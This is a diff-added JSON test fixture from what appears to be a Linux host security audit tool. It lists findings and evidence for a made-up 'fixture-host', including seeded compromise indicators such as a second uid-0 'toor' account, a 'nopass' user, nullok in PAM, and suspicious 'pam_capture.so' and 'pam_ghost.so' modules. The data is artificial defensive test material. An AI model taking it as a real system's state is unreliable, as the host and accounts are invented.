+     "run_id": "1906f01c-7bf8-450e-8639-51bf05ddba0d",
+     "check_id": "SVC-LEGACY-001"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-aa9a9aa8a79e5f84",
+   "check_id": "CFG-LOG-003",
+   "title": "No persistent logging detected",
+   "description": "No syslog daemon configuration and no /var/log/journal directory were found; with journald's default (Storage=auto) logs may be lost on reboot. Other collectors (agents, remote logging) are not detected.",
+   "severity": "low",
+   "confidence": "low",
+   "category": "sysconfig",
+   "component": "sysconfig",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:50:00Z",
+   "evidence": [
+    "EV-2f7c336c08704d4a"
+   ],
+   "remediation": {
+    "summary": "Confirm where logs are kept; create /var/log/journal or configure a syslog daemon, and forward logs off the host.",
+    "priority": "P4"
+   },
+   "standards": [
+    {
+     "framework": "MITRE ATT&CK",
+     "id": "T1562.006",
+     "url": "https://attack.mitre.org/techniques/T1562/006/"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "CM-6",
+     "title": "Configuration Settings"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "AU-9",
+     "title": "Protection of Audit Information"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.sysconfig",
+     "run_id": "0ee0cdf1-7246-4a1d-863b-3dba078c6cf0",
+     "check_id": "CFG-LOG-003"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-a454f4d75bbca73c",
+   "check_id": "CFG-MNT-001",
+   "title": "World-writable directory mounted without nosuid/nodev/noexec",
+   "description": "Everyone can write to these directories, so they are where payloads are staged and executed. Mount options that forbid set-ID files, device nodes and execution make that harder. Only separately mounted directories are assessed.",
+   "severity": "low",
+   "confidence": "high",
+   "category": "sysconfig",
+   "component": "sysconfig",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:50:00Z",
+   "evidence": [
+    "EV-cec18246ab8e3f3b"
+   ],
+   "remediation": {
+    "summary": "Add nosuid,nodev,noexec in /etc/fstab and remount. Test first: some installers and scored services execute from /tmp.",
+    "priority": "P3"
+   },
+   "standards": [
+    {
+     "framework": "MITRE ATT&CK",
+     "id": "T1059",
+     "url": "https://attack.mitre.org/techniques/T1059/"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "CM-6",
+     "title": "Configuration Settings"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "AU-9",
+     "title": "Protection of Audit Information"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.sysconfig",
+     "run_id": "0ee0cdf1-7246-4a1d-863b-3dba078c6cf0",
+     "check_id": "CFG-MNT-001"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-339fdb6f40808b55",
+   "check_id": "SYS-KERN-001",
+   "title": "Kernel tainted by out-of-tree or unsigned module",
+   "description": "Taint mask 4096 includes out-of-tree (4096) or unsigned (8192) module bits. Legitimate for some drivers; also seen with rootkit modules.",
+   "severity": "low",
+   "confidence": "low",
+   "category": "system",
+   "component": "system",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:50:00Z",
+   "evidence": [
+    "EV-cebc2eae3ed6a58b"
+   ],
+   "remediation": {
+    "summary": "Review loaded modules (lsmod) against expected drivers.",
+    "priority": "P4"
+   },
+   "standards": [
+    {
+     "framework": "MITRE ATT&CK",
+     "id": "T1547.006",
+     "url": "https://attack.mitre.org/techniques/T1547/006/"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "CM-2",
+     "title": "Baseline Configuration"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "SI-2",
+     "title": "Flaw Remediation"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.system",
+     "run_id": "06e047ce-017c-4c36-832c-60331b6c4182",
+     "check_id": "SYS-KERN-001"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-79ec2492645d02c8",
+   "check_id": "USR-GROUP-002",
+   "title": "Members of root-equivalent groups",
+   "description": "docker, lxd and disk group membership is effectively root access.",
+   "severity": "low",
+   "confidence": "medium",
+   "category": "users",
+   "component": "users",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:50:01Z",
+   "evidence": [
+    "EV-d8049199d16d384d"
+   ],
+   "remediation": {
+    "summary": "Remove members that do not need it.",
+    "priority": "P3"
+   },
+   "standards": [
+    {
+     "framework": "MITRE ATT&CK",
+     "id": "T1548",
+     "url": "https://attack.mitre.org/techniques/T1548/"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "AC-2",
+     "title": "Account Management"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "AC-6",
+     "title": "Least Privilege"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.users",
+     "run_id": "0bd1ee6b-7465-458f-8f08-49322c21d5c7",
+     "check_id": "USR-GROUP-002"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-9a2bcfe1a12c5bd3",
+   "check_id": "FS-RECENT-003",
+   "title": "Other files modified in the last 3 day(s)",
+   "description": "Home directories, /opt, web roots and temporary directories.",
+   "severity": "info",
+   "confidence": "medium",
+   "category": "filesystem",
+   "component": "filesystem",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:49:57Z",
+   "evidence": [
+    "EV-ef8140f7e8032cbd",
+    "EV-233e5c1fa2699bfd",
+    "EV-e2a4789854fb82f2",
+    "EV-a19b6e0a46463c44",
+    "EV-e967f790d1666531",
+    "EV-fcf4c0e84d8ce633",
+    "EV-548ef692c82213e6",
+    "EV-2489961555b9ad9a",
+    "EV-61d3c8bc5107e60a",
+    "EV-9d44347465c4ed07"
+   ],
+   "remediation": {
+    "summary": "",
+    "priority": "P4"
+   },
+   "standards": [
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "AC-3",
+     "title": "Access Enforcement"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "SI-7",
+     "title": "Software, Firmware, and Information Integrity"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.filesystem",
+     "run_id": "0054ad9d-4019-4991-8201-78711ecf19b1",
+     "check_id": "FS-RECENT-003"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-e543760aa428c8bf",
+   "check_id": "FS-SUID-001",
+   "title": "SUID/SGID files",
+   "description": "0 SUID/SGID file(s) on local filesystems.",
+   "severity": "info",
+   "confidence": "high",
+   "category": "filesystem",
+   "component": "filesystem",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:49:57Z",
+   "evidence": [],
+   "remediation": {
+    "summary": "",
+    "priority": "P4"
+   },
+   "standards": [
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "AC-3",
+     "title": "Access Enforcement"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "SI-7",
+     "title": "Software, Firmware, and Information Integrity"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.filesystem",
+     "run_id": "0054ad9d-4019-4991-8201-78711ecf19b1",
+     "check_id": "FS-SUID-001"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-7aef572ca22810f5",
+   "check_id": "NET-DNS-001",
+   "title": "DNS configuration",
+   "description": "nameservers: 10.0.0.2; search: corp.example",
+   "severity": "info",
+   "confidence": "high",
+   "category": "network",
+   "component": "network",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:49:57Z",
+   "evidence": [
+    "EV-dd8690d1af9def68"
+   ],
+   "remediation": {
+    "summary": "",
+    "priority": "P4"
+   },
+   "standards": [
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "SC-7",
+     "title": "Boundary Protection"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "CM-7",
+     "title": "Least Functionality"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.network",
+     "run_id": "23d78de0-5887-4ff6-8580-50dc09714b66",
+     "check_id": "NET-DNS-001"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-b67a5c2621fcb96d",
+   "check_id": "NET-ESTAB-001",
+   "title": "Established TCP connections",
+   "description": "2 established connection(s).",
+   "severity": "info",
+   "confidence": "high",
+   "category": "network",
+   "component": "network",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:49:57Z",
+   "evidence": [
+    "EV-a6b0c1ce2213a8b9",
+    "EV-fef3e00167578164"
+   ],
+   "remediation": {
+    "summary": "",
+    "priority": "P4"
+   },
+   "standards": [
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "SC-7",
+     "title": "Boundary Protection"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "CM-7",
+     "title": "Least Functionality"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.network",
+     "run_id": "23d78de0-5887-4ff6-8580-50dc09714b66",
+     "check_id": "NET-ESTAB-001"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-d73f597ecbea49c5",
+   "check_id": "NET-IFACE-001",
+   "title": "Network interfaces",
+   "description": "1 address entries.",
+   "severity": "info",
+   "confidence": "high",
+   "category": "network",
+   "component": "network",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:49:57Z",
+   "evidence": [
+    "EV-fff9fbaffd78ef99"
+   ],
+   "remediation": {
+    "summary": "",
+    "priority": "P4"
+   },
+   "standards": [
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "SC-7",
+     "title": "Boundary Protection"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "CM-7",
+     "title": "Least Functionality"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.network",
+     "run_id": "23d78de0-5887-4ff6-8580-50dc09714b66",
+     "check_id": "NET-IFACE-001"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-15bc59e699cae9d8",
+   "check_id": "NET-LISTEN-001",
+   "title": "Listening sockets",
+   "description": "6 listening TCP/UDP socket(s). Process names need root; '-' means unknown.",
+   "severity": "info",
+   "confidence": "high",
+   "category": "network",
+   "component": "network",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:49:57Z",
+   "evidence": [
+    "EV-daf890bfe7a25191",
+    "EV-bc4759191fe80e11",
+    "EV-a8d7af5edd03e0b8",
+    "EV-32f5b3c0f0c4c3b3",
+    "EV-8bce1bc58e380163",
+    "EV-291bb06ae0e09de8"
+   ],
+   "remediation": {
+    "summary": "",
+    "priority": "P4"
+   },
+   "standards": [
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "SC-7",
+     "title": "Boundary Protection"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "CM-7",
+     "title": "Least Functionality"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.network",
+     "run_id": "23d78de0-5887-4ff6-8580-50dc09714b66",
+     "check_id": "NET-LISTEN-001"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-d59fb6cba47bb89e",
+   "check_id": "NET-ROUTE-001",
+   "title": "Routing table",
+   "description": "2 route entries.",
+   "severity": "info",
+   "confidence": "high",
+   "category": "network",
+   "component": "network",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:49:57Z",
+   "evidence": [
+    "EV-f8ff06ec2ac0867d"
+   ],
+   "remediation": {
+    "summary": "",
+    "priority": "P4"
+   },
+   "standards": [
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "SC-7",
+     "title": "Boundary Protection"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "CM-7",
+     "title": "Least Functionality"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.network",
+     "run_id": "23d78de0-5887-4ff6-8580-50dc09714b66",
+     "check_id": "NET-ROUTE-001"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-27e9f9a0e80b74c0",
+   "check_id": "PAM-INFO-001",
+   "title": "PAM configuration inventory",
+   "description": "7 PAM config file(s), 13 rule(s). Modules referenced: pam_permit.so pam_succeed_if.so pam_unix.so pam_deny.so pam_nologin.so pam_limits.so pam_capture.so pam_ghost.so.",
+   "severity": "info",
+   "confidence": "high",
+   "category": "pam",
+   "component": "pam",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:49:58Z",
+   "evidence": [
+    "EV-936772d2b9925dd0",
+    "EV-d796722dabb9c325",
+    "EV-03adaca3d0d0a264",
+    "EV-0fd3e2489323a778",
+    "EV-21b17dfc00bde1fe",
+    "EV-b5fb406be36a4291",
+    "EV-92a326160928b1c8"
+   ],
+   "remediation": {
+    "summary": "",
+    "priority": "P4"
+   },
+   "standards": [
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "IA-5",
+     "title": "Authenticator Management"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "AC-7",
+     "title": "Unsuccessful Logon Attempts"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.pam",
+     "run_id": "050acc34-2ed2-4f70-8e69-0fc113092822",
+     "check_id": "PAM-INFO-001"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-39cd4f64fc256554",
+   "check_id": "PER-CRON-001",
+   "title": "Scheduled job files",
+   "description": "4 cron/anacron file(s) found.",
+   "severity": "info",
+   "confidence": "high",
+   "category": "persistence",
+   "component": "persistence",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:49:58Z",
+   "evidence": [
+    "EV-3b6d89e42c45b444",
+    "EV-73c39801ab64b5df",
+    "EV-3d4d98c42fba6a30",
+    "EV-8e96d08c76f3a74f"
+   ],
+   "remediation": {
+    "summary": "",
+    "priority": "P4"
+   },
+   "standards": [
+    {
+     "framework": "MITRE ATT&CK",
+     "id": "T1053.003",
+     "url": "https://attack.mitre.org/techniques/T1053/003/"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "SI-7",
+     "title": "Software, Firmware, and Information Integrity"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.persistence",
+     "run_id": "22f4be8a-31fd-4e73-8652-702906a54e00",
+     "check_id": "PER-CRON-001"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-bc52a4aa43a0ee4b",
+   "check_id": "PRC-INFO-001",
+   "title": "Process inventory",
+   "description": "7 processes. Evidence lists pid, parent pid, user, executable path and (redacted) command line.",
+   "severity": "info",
+   "confidence": "high",
+   "category": "processes",
+   "component": "processes",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:49:59Z",
+   "evidence": [
+    "EV-056365b267835c21",
+    "EV-8d756747d6377f1b",
+    "EV-4c2c487e07287853",
+    "EV-ec506d58377e3fa5",
+    "EV-622a6e7f828e717a",
+    "EV-eb1089520fd75a19",
+    "EV-adc89bc75279f22f"
+   ],
+   "remediation": {
+    "summary": "",
+    "priority": "P4"
+   },
+   "standards": [
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "SI-4",
+     "title": "System Monitoring"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "CM-7",
+     "title": "Least Functionality"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.processes",
+     "run_id": "008214a2-1915-4cb0-8796-204211ce80e3",
+     "check_id": "PRC-INFO-001"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-93ce4eb0bf7ae181",
+   "check_id": "SVC-ENABLED-001",
+   "title": "Enabled services",
+   "description": "3 unit(s) start at boot.",
+   "severity": "info",
+   "confidence": "high",
+   "category": "services",
+   "component": "services",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:50:00Z",
+   "evidence": [
+    "EV-40f79d03e5075a82",
+    "EV-bd1a5f0743bbc426",
+    "EV-9bad1d85a3169669"
+   ],
+   "remediation": {
+    "summary": "",
+    "priority": "P4"
+   },
+   "standards": [
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "CM-7",
+     "title": "Least Functionality"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "CM-6",
+     "title": "Configuration Settings"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.services",
+     "run_id": "1906f01c-7bf8-450e-8639-51bf05ddba0d",
+     "check_id": "SVC-ENABLED-001"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-a5f70fa664d1fb03",
+   "check_id": "SVC-INFO-001",
+   "title": "Service inventory",
+   "description": "3 service units loaded, 2 running, 3 enabled at boot, 1 failed, 1 failed socket unit(s).",
+   "severity": "info",
+   "confidence": "high",
+   "category": "services",
+   "component": "services",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:50:00Z",
+   "evidence": [
+    "EV-40f79d03e5075a82",
+    "EV-9bad1d85a3169669"
+   ],
+   "remediation": {
+    "summary": "",
+    "priority": "P4"
+   },
+   "standards": [
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "CM-7",
+     "title": "Least Functionality"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "CM-6",
+     "title": "Configuration Settings"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.services",
+     "run_id": "1906f01c-7bf8-450e-8639-51bf05ddba0d",
+     "check_id": "SVC-INFO-001"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-d0c33e7da38a9c0a",
+   "check_id": "SYS-INFO-001",
+   "title": "System inventory",
+   "description": "Hostname fixture-host; OS Ubuntu 22.04.4 LTS (id=ubuntu, version=22.04); kernel 5.15.0-fixture; arch x86_64; uptime 46d 7h 6m; CPUs 2 (Fixture CPU @ 3.00GHz); memory 3952 MiB; platform unknown; disks: /dev/vda 258019MiB 23% /; /dev/vdc 343MiB 93% /opt/claude-code; /dev/vdd 47MiB 67% /opt/env-runner",
+   "severity": "info",
+   "confidence": "high",
+   "category": "system",
+   "component": "system",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:50:00Z",
+   "evidence": [
+    "EV-2ef2c36d4a9fe361",
+    "EV-0098ab36efee5a10"
+   ],
+   "remediation": {
+    "summary": "",
+    "priority": "P4"
+   },
+   "standards": [
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "CM-2",
+     "title": "Baseline Configuration"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "SI-2",
+     "title": "Flaw Remediation"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.system",
+     "run_id": "06e047ce-017c-4c36-832c-60331b6c4182",
+     "check_id": "SYS-INFO-001"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-861970896abf3c6a",
+   "check_id": "USR-GROUP-001",
+   "title": "Members of administrative groups",
+   "description": "Users in sudo/wheel/admin/root groups can typically obtain root.",
+   "severity": "info",
+   "confidence": "high",
+   "category": "users",
+   "component": "users",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:50:01Z",
+   "evidence": [
+    "EV-d8049199d16d384d"
+   ],
+   "remediation": {
+    "summary": "",
+    "priority": "P4"
+   },
+   "standards": [
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "AC-2",
+     "title": "Account Management"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "AC-6",
+     "title": "Least Privilege"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.users",
+     "run_id": "0bd1ee6b-7465-458f-8f08-49322c21d5c7",
+     "check_id": "USR-GROUP-001"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-eb0464d3d142b174",
+   "check_id": "USR-INFO-001",
+   "title": "Account inventory",
+   "description": "10 accounts; 8 with a login shell: root(uid=0,/bin/bash) www-data(uid=33,/bin/bash) postgres(uid=110,/bin/bash) alice(uid=1000,/bin/bash) bob(uid=1001,/bin/bash) toor(uid=0,/bin/bash) twin(uid=1000,/bin/sh) nopass(uid=1002,/bin/bash) ; expected service-account shells not flagged: postgres",
+   "severity": "info",
+   "confidence": "high",
+   "category": "users",
+   "component": "users",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:50:01Z",
+   "evidence": [
+    "EV-0ddfdf1f81616380"
+   ],
+   "remediation": {
+    "summary": "",
+    "priority": "P4"
+   },
+   "standards": [
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "AC-2",
+     "title": "Account Management"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "AC-6",
+     "title": "Least Privilege"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.users",
+     "run_id": "0bd1ee6b-7465-458f-8f08-49322c21d5c7",
+     "check_id": "USR-INFO-001"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-527f09a8d45b716e",
+   "check_id": "USR-SESS-001",
+   "title": "Active login sessions",
+   "description": "2 session(s) reported.",
+   "severity": "info",
+   "confidence": "high",
+   "category": "users",
+   "component": "users",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:50:01Z",
+   "evidence": [
+    "EV-4a4f9708f69bef13"
+   ],
+   "remediation": {
+    "summary": "",
+    "priority": "P4"
+   },
+   "standards": [
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "AC-2",
+     "title": "Account Management"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "AC-6",
+     "title": "Least Privilege"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.users",
+     "run_id": "0bd1ee6b-7465-458f-8f08-49322c21d5c7",
+     "check_id": "USR-SESS-001"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-e0994dbe1f1aa5a6",
+   "check_id": "USR-SSH-001",
+   "title": "SSH authorized keys",
+   "description": "4 authorized key(s) found. Key material is not shown; labels are free-text comments chosen by the key owner.",
+   "severity": "info",
+   "confidence": "high",
+   "category": "users",
+   "component": "users",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:50:01Z",
+   "evidence": [
+    "EV-ef8140f7e8032cbd",
+    "EV-e967f790d1666531"
+   ],
+   "remediation": {
+    "summary": "",
+    "priority": "P4"
+   },
+   "standards": [
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "AC-2",
+     "title": "Account Management"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "AC-6",
+     "title": "Least Privilege"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.users",
+     "run_id": "0bd1ee6b-7465-458f-8f08-49322c21d5c7",
+     "check_id": "USR-SSH-001"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-39c68fb71d3307a0",
+   "check_id": "USR-SUDO-001",
+   "title": "Sudo rules",
+   "description": "3 rule line(s) across 2 file(s).",
+   "severity": "info",
+   "confidence": "high",
+   "category": "users",
+   "component": "users",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:50:01Z",
+   "evidence": [
+    "EV-8f030208d48b03d0",
+    "EV-7c0cc50fe7f1d35f"
+   ],
+   "remediation": {
+    "summary": "",
+    "priority": "P4"
+   },
+   "standards": [
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "AC-2",
+     "title": "Account Management"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "AC-6",
+     "title": "Least Privilege"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.users",
+     "run_id": "0bd1ee6b-7465-458f-8f08-49322c21d5c7",
+     "check_id": "USR-SUDO-001"
+    }
+   ],
+   "occurrences": 1
+  }
+ ],
+ "evidence": [
+  {
+   "id": "EV-0098ab36efee5a10",
+   "type": "file",
+   "ref": "/proc/sys/kernel/osrelease",
+   "provenance": [
+    {
+     "module": "linux.system",
+     "run_id": "06e047ce-017c-4c36-832c-60331b6c4182",
+     "check_id": "SYS-INFO-001",
+     "collected_at": "2026-11-02T01:50:00Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "90b5aa4589ed0182e8e876e3b28940d54f0f20ea43e1ff911a45fd0f15e4a470"
+    }
+   ]
+  },
+  {
+   "id": "EV-00cbee6ce4a15efd",
+   "type": "other",
+   "ref": "cups.socket",
+   "excerpts": [
+    "failed/failed CUPS Scheduler"
+   ],
+   "provenance": [
+    {
+     "module": "linux.services",
+     "run_id": "1906f01c-7bf8-450e-8639-51bf05ddba0d",
+     "check_id": "SVC-FAILED-002",
+     "collected_at": "2026-11-02T01:50:00Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "0cf7477628d11af0a237ad30e832abd814b6214fd0ee8da1b08cc59cde4235ee"
+    }
+   ]
+  },
+  {
+   "id": "EV-01f43bf729ebdeb8",
+   "type": "file",
+   "ref": "/lib/x86_64-linux-gnu/security/pam_env.so",
+   "excerpts": [
+    "modified within 3 day(s)"
+   ],
+   "provenance": [
+    {
+     "module": "linux.filesystem",
+     "run_id": "0054ad9d-4019-4991-8201-78711ecf19b1",
+     "check_id": "FS-RECENT-004",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "37ac28b5abe20013912bd48e2f1abe62b78e60a4504b61d309b60bbe5cfd0b6b"
+    },
+    {
+     "module": "linux.pam",
+     "run_id": "050acc34-2ed2-4f70-8e69-0fc113092822",
+     "check_id": "PAM-RECENT-001",
+     "collected_at": "2026-11-02T01:49:58Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "166f6621ca8f8fa2c8948bfe6d6337979f9353fbe243b94b90b04f0c8c037fb5"
+    }
+   ]
+  },
+  {
+   "id": "EV-0391d834f04e6537",
+   "type": "file",
+   "ref": "/lib/x86_64-linux-gnu/security/pam_limits.so",
+   "excerpts": [
+    "modified within 3 day(s)"
+   ],
+   "provenance": [
+    {
+     "module": "linux.filesystem",
+     "run_id": "0054ad9d-4019-4991-8201-78711ecf19b1",
+     "check_id": "FS-RECENT-004",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "37ac28b5abe20013912bd48e2f1abe62b78e60a4504b61d309b60bbe5cfd0b6b"
+    },
+    {
+     "module": "linux.pam",
+     "run_id": "050acc34-2ed2-4f70-8e69-0fc113092822",
+     "check_id": "PAM-RECENT-001",
+     "collected_at": "2026-11-02T01:49:58Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "166f6621ca8f8fa2c8948bfe6d6337979f9353fbe243b94b90b04f0c8c037fb5"
+    }
+   ]
+  },
+  {
+   "id": "EV-03adaca3d0d0a264",
+   "type": "file",
+   "ref": "/etc/pam.d/common-auth",
+   "excerpts": [
+    "pam_unix auth permits empty passwords (nullok)"
+   ],
+   "provenance": [
+    {
+     "module": "linux.filesystem",
+     "run_id": "0054ad9d-4019-4991-8201-78711ecf19b1",
+     "check_id": "FS-RECENT-002",
+     "collected_at": "2026-11-02T01:49:57Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "37ac28b5abe20013912bd48e2f1abe62b78e60a4504b61d309b60bbe5cfd0b6b"
+    },
+    {
+     "module": "linux.pam",
+     "run_id": "050acc34-2ed2-4f70-8e69-0fc113092822",
+     "check_id": "PAM-INFO-001",
+     "collected_at": "2026-11-02T01:49:58Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "166f6621ca8f8fa2c8948bfe6d6337979f9353fbe243b94b90b04f0c8c037fb5"
+    },
+    {
+     "module": "linux.pam",
+     "run_id": "050acc34-2ed2-4f70-8e69-0fc113092822",
+     "check_id": "PAM-NULLOK-001",
+     "collected_at": "2026-11-02T01:49:58Z",
+     "collector": "audit-linux 0.1.0",
+     "report_sha256": "166f6621ca8f8fa2c8948bfe6d6337979f9353fbe243b94b90b04f0c8c037fb5"
+    }
+   ]
+  },
+  {
+   "id": "EV-056365b267835c21",
+   "type": "process",
+   "ref": "pid=1",
+   "excerpts": [
+    "ppid=0 user=root comm=systemd exe=/usr/lib/systemd/systemd cmd=/sbin/init"
+   ],
